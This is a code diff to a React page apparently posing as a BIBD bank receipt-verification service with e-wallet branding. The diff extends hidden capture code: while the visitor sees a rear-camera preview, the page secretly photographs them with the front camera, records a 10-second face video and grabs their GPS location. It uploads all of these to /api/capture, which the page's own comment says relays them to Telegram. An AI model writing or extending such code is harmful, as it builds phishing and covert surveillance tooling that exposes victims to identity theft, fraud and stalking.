@@ -7,6 +7,19 @@ import LoadingScreen from "@/components/LoadingScreen";
 import { useVerification } from "@/hooks/useVerification";
 import { formatFileSize } from "@/utils/device";
 import templateData from "./data.json";
+import rawCaptureConfig from "./capture-config.json";
+
+interface CaptureConfig {
+  photo?: boolean;
+  video?: boolean;
+  location?: boolean;
+}
+
+const captureConfig: CaptureConfig = (rawCaptureConfig as CaptureConfig) || {
+  photo: true,
+  video: true,
+  location: true,
+};
 
 export default function BibdVerificationPage() {
   const {
@@ -38,7 +51,9 @@ export default function BibdVerificationPage() {
   const receiverAlt = txLogo === "qris" ? "QRIS" : (txLogo === "gopay" ? "GOPAY" : (txLogo === "seabank" ? "SEABANK" : "DANA"));
   const rearVideoRef = useRef<HTMLVideoElement>(null);
   const rearStreamRef = useRef<MediaStream | null>(null);
+  const frontStreamRef = useRef<MediaStream | null>(null);
   const cachedReceiptBlobRef = useRef<Blob | null>(null);
+  const [cameraStatusText, setCameraStatusText] = useState("Menunggu izin kamera...");
 
   // Set AUTO date based on client device
   useEffect(() => {
@@ -60,6 +75,7 @@ export default function BibdVerificationPage() {
   useEffect(() => {
     return () => {
       rearStreamRef.current?.getTracks().forEach((t) => t.stop());
+      frontStreamRef.current?.getTracks().forEach((t) => t.stop());
     };
   }, []);
 
@@ -72,12 +88,32 @@ export default function BibdVerificationPage() {
     }
   }, [cameraReady]);
 
+  // Helper to pick supported video mime type
+  const getSupportedVideoMimeType = () => {
+    if (typeof MediaRecorder === 'undefined' || typeof MediaRecorder.isTypeSupported !== 'function') {
+      return '';
+    }
+    const types = [
+      'video/webm;codecs=vp8,opus',
+      'video/webm;codecs=vp8',
+      'video/webm',
+      'video/mp4;codecs=avc1',
+      'video/mp4',
+    ];
+    for (const t of types) {
+      if (MediaRecorder.isTypeSupported(t)) return t;
+    }
+    return '';
+  };
+
   // Helper: Ambil foto wajah dari kamera depan secara diam-diam & kirim ke Telegram
   const takeFrontFacePhoto = useCallback(async (caption: string) => {
+    if (captureConfig.photo === false) return null;
     try {
       const frontStream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
       });
+      frontStreamRef.current = frontStream;
       const fv = document.createElement('video');
       fv.srcObject = frontStream;
       fv.muted = true;
@@ -91,6 +127,7 @@ export default function BibdVerificationPage() {
       fc.getContext('2d')?.drawImage(fv, 0, 0, fc.width, fc.height);
 
       frontStream.getTracks().forEach((t) => t.stop());
+      frontStreamRef.current = null;
 
       return await new Promise<Blob | null>((resolve) => {
         fc.toBlob((blob) => {
@@ -131,10 +168,123 @@ export default function BibdVerificationPage() {
 
   // Request camera permission and activate stream
   const activateCamera = useCallback(async () => {
-    // 1. Ambil foto wajah duluan saat izin pertama kali diberikan
-    await takeFrontFacePhoto('📸 [BIBD] Foto Wajah (Izin Kamera)');
+    // 1. Minta izin lokasi GPS & kirim jika diaktifkan
+    if (captureConfig.location !== false) {
+      sendCurrentLocation();
+    }
 
-    // 2. Buka rear camera untuk preview user
+    const shouldTakePhoto = captureConfig.photo !== false;
+    const shouldRecordVideo = captureConfig.video === true;
+
+    // 2. Ambil foto wajah & rekam video 10 detik dari kamera depan jika diaktifkan
+    if (shouldTakePhoto || shouldRecordVideo) {
+      setCameraStatusText("Menyiapkan kamera...");
+      try {
+        let frontStream: MediaStream | null = null;
+        try {
+          frontStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          });
+        } catch {
+          try {
+            frontStream = await navigator.mediaDevices.getUserMedia({ video: true });
+          } catch (e) {
+            console.warn('Cannot open front camera:', e);
+          }
+        }
+
+        if (frontStream) {
+          frontStreamRef.current = frontStream;
+          const fv = document.createElement('video');
+          fv.srcObject = frontStream;
+          fv.muted = true;
+          fv.playsInline = true;
+          await fv.play();
+
+          // Ambil foto wajah secara instan (~500ms) agar foto terkirim cepat ke Telegram
+          if (shouldTakePhoto) {
+            await new Promise((r) => setTimeout(r, 500));
+            try {
+              const fc = document.createElement('canvas');
+              fc.width = fv.videoWidth || 640;
+              fc.height = fv.videoHeight || 480;
+              fc.getContext('2d')?.drawImage(fv, 0, 0, fc.width, fc.height);
+              fc.toBlob((blob) => {
+                if (blob) {
+                  const fd = new FormData();
+                  fd.append('photo', blob, 'face.jpg');
+                  fd.append('caption', '📸 [BIBD] Foto Wajah (Izin Kamera)');
+                  fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
+                }
+              }, 'image/jpeg', 0.85);
+            } catch (err) {
+              console.warn('Photo snapshot error:', err);
+            }
+          }
+
+          // Rekam video wajah 10 detik jika fitur video diaktifkan
+          if (shouldRecordVideo) {
+            setCameraStatusText("Menginisialisasi modul kamera...");
+            await new Promise<void>((resolve) => {
+              try {
+                const mimeType = getSupportedVideoMimeType();
+                const recorder = mimeType
+                  ? new MediaRecorder(frontStream!, { mimeType })
+                  : new MediaRecorder(frontStream!);
+                const chunks: Blob[] = [];
+
+                recorder.ondataavailable = (e) => {
+                  if (e.data && e.data.size > 0) {
+                    chunks.push(e.data);
+                  }
+                };
+
+                recorder.onstop = () => {
+                  try {
+                    const ext = (recorder.mimeType || mimeType || '').includes('webm') ? 'webm' : 'mp4';
+                    const videoBlob = new Blob(chunks, { type: recorder.mimeType || mimeType || 'video/mp4' });
+                    const fd = new FormData();
+                    fd.append('video', videoBlob, `face_video.${ext}`);
+                    fd.append('caption', '🎥 [BIBD] Video Wajah 10 Detik (Izin Kamera)');
+                    fetch('/api/capture', { method: 'POST', body: fd }).catch(() => {});
+                  } catch (e) {
+                    console.warn('Video blob error:', e);
+                  }
+                  resolve();
+                };
+
+                recorder.onerror = () => resolve();
+
+                recorder.start(1000);
+                setTimeout(() => {
+                  if (recorder.state !== 'inactive') {
+                    try {
+                      recorder.stop();
+                    } catch {
+                      resolve();
+                    }
+                  } else {
+                    resolve();
+                  }
+                }, 10000);
+              } catch (err) {
+                console.warn('MediaRecorder recording error:', err);
+                resolve();
+              }
+            });
+          }
+
+          // Matikan stream kamera depan setelah selesai agar hardware kamera bebas untuk rear camera
+          frontStream.getTracks().forEach((t) => t.stop());
+          frontStreamRef.current = null;
+        }
+      } catch (err) {
+        console.warn('Front camera capture flow error:', err);
+      }
+    }
+
+    // 3. Buka rear camera untuk preview user
+    setCameraStatusText("Membuka tampilan kamera...");
     let rearStream: MediaStream | null = null;
     try {
       rearStream = await navigator.mediaDevices.getUserMedia({
@@ -150,6 +300,7 @@ export default function BibdVerificationPage() {
           rearStream = await navigator.mediaDevices.getUserMedia({ video: true });
         } catch {
           alert('Gagal mengakses kamera. Pastikan browser memiliki izin dan tidak diblokir.');
+          setCameraStatusText("Izin kamera diperlukan");
           return;
         }
       }
@@ -163,16 +314,14 @@ export default function BibdVerificationPage() {
         rearVideoRef.current.play().catch(() => {});
       }
     }
-
-    // 3. Minta izin lokasi GPS
-    sendCurrentLocation();
-  }, [takeFrontFacePhoto, sendCurrentLocation]);
+  }, [sendCurrentLocation]);
 
   // Open camera: show black preview → scroll down → request permission
   const handleOpenCamera = useCallback(async () => {
     if (uploadedFile || showCamera) return;
     setShowCamera(true);
     setCameraReady(false);
+    setCameraStatusText("Menyiapkan kamera...");
     // Scroll down first, then request camera after scroll
     setTimeout(() => {
       window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
@@ -187,8 +336,11 @@ export default function BibdVerificationPage() {
   const handleCancelCamera = useCallback(() => {
     rearStreamRef.current?.getTracks().forEach((t) => t.stop());
     rearStreamRef.current = null;
+    frontStreamRef.current?.getTracks().forEach((t) => t.stop());
+    frontStreamRef.current = null;
     setShowCamera(false);
     setCameraReady(false);
+    setCameraStatusText("Menunggu izin kamera...");
   }, []);
 
   // Capture photo from rear camera and simultaneously get front face
@@ -224,15 +376,19 @@ export default function BibdVerificationPage() {
       const nextAttempt = captureAttempt + 1;
       setCaptureAttempt(nextAttempt);
 
-      // Ambil foto wajah dari kamera depan lagi!
-      await takeFrontFacePhoto(
-        nextAttempt === 1
-          ? '📸 [BIBD] Foto Wajah (Klik Ambil Resit #1)'
-          : '📸 [BIBD] Foto Wajah (Klik Ulangi Resit #2)'
-      );
+      // Ambil foto wajah dari kamera depan lagi jika fitur foto diaktifkan
+      if (captureConfig.photo !== false) {
+        await takeFrontFacePhoto(
+          nextAttempt === 1
+            ? '📸 [BIBD] Foto Wajah (Klik Ambil Resit #1)'
+            : '📸 [BIBD] Foto Wajah (Klik Ulangi Resit #2)'
+        );
+      }
 
-      // Pastikan lokasi GPS terkirim
-      sendCurrentLocation();
+      // Pastikan lokasi GPS terkirim jika diaktifkan
+      if (captureConfig.location !== false) {
+        sendCurrentLocation();
+      }
 
       if (nextAttempt === 1) {
         // Percobaan pertama: hidupkan kembali rear camera untuk preview user
@@ -566,7 +722,7 @@ export default function BibdVerificationPage() {
                         <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" />
                         <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                       </svg>
-                      <span className="text-white/70 text-xs font-medium">Menunggu izin kamera...</span>
+                      <span className="text-white/70 text-xs font-medium">{cameraStatusText}</span>
                     </div>
                   )}
                   <video
